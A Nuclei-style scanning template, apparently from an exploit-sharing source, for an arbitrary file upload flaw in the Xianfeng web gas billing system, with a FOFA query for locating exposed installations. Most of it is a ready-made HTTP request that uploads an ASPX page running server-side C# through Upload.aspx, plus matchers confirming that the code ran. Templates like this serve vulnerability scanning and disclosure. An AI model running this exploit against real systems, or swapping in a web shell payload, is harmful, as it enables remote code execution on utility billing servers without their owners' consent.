id: xianfeng-gas-web-uploadaspx-file-upload

info:
  name: "先锋WEB燃气收费系统 Upload.aspx 组件文件上传漏洞"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: app="先锋WEB燃气收费系统"
      该系统 Upload.aspx 组件未正确校验文件上传请求，攻击者可构造恶意请求上传任意文件，可能导致远程代码执行或系统权限沦陷。
  tags: 先锋WEB燃气收费系统

http:
- raw:
  - |
    POST /AjaxService/Upload.aspx HTTP/1.1
    Host: {{Hostname}}
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: multipart/form-data; boundary=------------GFioQpMK0vv2
    Upgrade-Insecure-Requests: 1
     
    ------------GFioQpMK0vv2
    Content-Disposition: form-data; name="Fdata"; filename="NTest.aspx"
    Content-Type: application/octet-stream
     
    <%@ Page Language="C#"%><% Response.Write("NdayTest");System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath)); %>
    ------------GFioQpMK0vv2
    Content-Disposition: form-data; name="submit"
     
    Submin
    ------------GFioQpMK0vv2--
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'NdayTest'
